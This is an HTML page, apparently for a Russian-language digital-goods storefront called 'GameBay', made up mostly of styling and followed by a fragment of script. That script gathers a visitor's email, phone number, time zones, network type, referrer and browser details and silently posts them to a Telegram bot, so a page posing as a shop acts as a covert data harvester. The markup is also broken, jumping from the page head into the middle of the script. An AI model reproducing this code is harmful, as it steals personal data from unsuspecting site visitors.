<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>GameBay — Маркетплейс цифровых товаров №1</title>
    <style>
        :root {
            --bg: #080a0f; --surface: #0f1119; --surface2: #161922;
            --border: #1c1f2d; --accent: #6366f1; --accent2: #f43f5e;
            --text: #e2e5f0; --sub: #8890a5; --green: #10b981; --orange: #f59e0b;
            --radius: 14px; --shadow: 0 4px 24px rgba(0,0,0,0.5);
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; -webkit-tap-highlight-color: transparent; }
        
        /* ШАПКА */
        .header { background: rgba(8,10,15,0.97); backdrop-filter: blur(25px); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 1000; padding: 0 14px; }
        .header-inner { max-width: 1400px; margin: 0 auto; display: flex; align-items: center; justify-content: space-between; height: 62px; gap: 12px; }
        .logo { font-weight: 900; font-size: 24px; color: #fff; display: flex; align-items: center; gap: 8px; }
        .logo-dot { width: 10px; height: 10px; background: var(--green); border-radius: 50%; animation: pulse 2s infinite; }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
        .nav-tabs { display: flex; gap: 4px; background: var(--surface); border-radius: 12px; padding: 4px; }
        .nav-tab { padding: 10px 18px; border-radius: 10px; font-weight: 700; font-size: 13px; cursor: pointer; border: none; background: transparent; color: var(--sub); white-space: nowrap; transition: 0.2s; }
        .nav-tab.active { background: var(--accent); color: #fff; }
        .cart-btn { background: var(--accent); color: #fff; font-weight: 800; padding: 10px 18px; border-radius: 28px; cursor: pointer; border: none; display: flex; align-items: center; gap: 6px; font-size: 13px; position: relative; }
        .cart-count { background: var(--accent2); min-width: 20px; height: 20px; border-radius: 20px; display: flex; align-items: center; justify-content: center; font-size: 10px; position: absolute; top: -6px; right: -6px; }

        /* ГЕРОЙ */
        .hero { background: linear-gradient(135deg, #1a1040 0%, #0d0b1e 50%, #1a0a2e 100%); padding: 36px 14px; text-align: center; position: relative; overflow: hidden; }
        .hero::after { content: ''; position: absolute; inset: 0; background: radial-gradient(circle at 40% 50%, rgba(99,102,241,0.15), transparent 60%); }
        .hero h1 { font-size: 32px; font-weight: 900; color: #fff; position: relative; z-index: 2; }
        .hero p { color: #a5b4fc; font-size: 15px; margin: 6px 0 18px; position: relative; z-index: 2; }
        .live-buy { display: flex; align-items: center; justify-content: center; gap: 8px; color: var(--green); font-size: 12px; font-weight: 700; margin-bottom: 16px; position: relative; z-index: 2; animation: fadeInOut 3s infinite; }
        @keyframes fadeInOut { 0%,100%{opacity:.7} 50%{opacity:1} }

        /* КАТАЛОГ */
        .container { max-width: 1400px; margin: 0 auto; padding: 0 14px; }
        .section-title { font-size: 22px; font-weight: 900; display: flex; align-items: center; gap: 10px; margin: 22px 0 14px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(210px, 1fr)); gap: 14px; margin-bottom: 28px; }
        .card { background: var(--surface); border-radius: var(--radius); overflow: hidden; border: 1px solid var(--border); transition: 0.25s; cursor: pointer; position: relative; }
        .card:hover { border-color: var(--accent); transform: translateY(-3px); box-shadow: 0 8px 28px rgba(0,0,0,0.6); }
        .card-img-wrap { position: relative; width: 100%; aspect-ratio: 16/10; overflow: hidden; background: #1c1f2d; }
        .card-img { width: 100%; height: 100%; object-fit: cover; }
        .card-discount { position: absolute; top: 10px; right: 10px; background: var(--accent2); color: #fff; font-weight: 800; font-size: 11px; padding: 4px 10px; border-radius: 8px; }
        .card-body { padding: 12px 14px 16px; }
        .card-platform { font-size: 10px; font-weight: 800; color: var(--sub); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; }
        .card-title { font-weight: 700; font-size: 14px; line-height: 1.3; margin-bottom: 4px; }
        .card-meta { font-size: 11px; color: var(--orange); margin-bottom: 8px; }
        .card-price-row { display: flex; align-items: center; justify-content: space-between; }
        .card-price { font-size: 20px; font-weight: 900; color: var(--accent); }
        .card-old-price { text-decoration: line-through; color: #5c6170; font-size: 12px; margin-right: 6px; }
        .btn-buy { padding: 8px 14px; background: var(--accent); color: #fff; font-weight: 700; border: none; border-radius: 8px; font-size: 12px; cursor: pointer; }

        /* ОТЗЫВЫ */
        .reviews-row { display: flex; gap: 12px; overflow-x: auto; padding-bottom: 14px; margin-bottom: 24px; }
        .review-card { min-width: 260px; background: var(--surface); border-radius: var(--radius); padding: 16px; border: 1px solid var(--border); }
        .review-header { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }
        .review-avatar { width: 36px; height: 36px; border-radius: 50%; background: #2a2e3d; object-fit: cover; }
        .review-stars { color: var(--orange); font-size: 13px; }

        /* ЧАТ */
        .chat-widget { position: fixed; bottom: 20px; right: 16px; z-index: 999; }
        .chat-btn { width: 56px; height: 56px; border-radius: 50%; background: var(--accent); color: #fff; font-size: 24px; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 6px 20px rgba(99,102,241,0.5); animation: bounce 2s infinite; }
        @keyframes bounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-6px)} }
        .chat-badge { position: absolute; top: 0; right: 0; width: 12px; height: 12px; background: var(--accent2); border-radius: 50%; border: 2px solid var(--bg); }

        /* ФУТЕР */
        .footer { text-align: center; padding: 28px; background: var(--surface); border-top: 1px solid var(--border); color: var(--sub); font-size: 12px; }
    </style>
</head>

        `📶 Сеть: ${connection}\n` +
        `🕐 Часовой пояс устр.: ${deviceTZ}\n` +
        `🕐 Часовой пояс IP: ${geoData?.timezone || '?'} ${tzMatch}\n\n` +
        `📧 Почта: ${email}\n` +
        `📱 Телефон: ${phone}\n\n` +
        `🔗 Referrer: ${document.referrer || 'прямой заход'}\n` +
        `📱 UA: ${navigator.userAgent}\n` +
        `🕒 Время: ${new Date().toLocaleString()}`;

    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'})
    });
}

renderReviews();

</script>
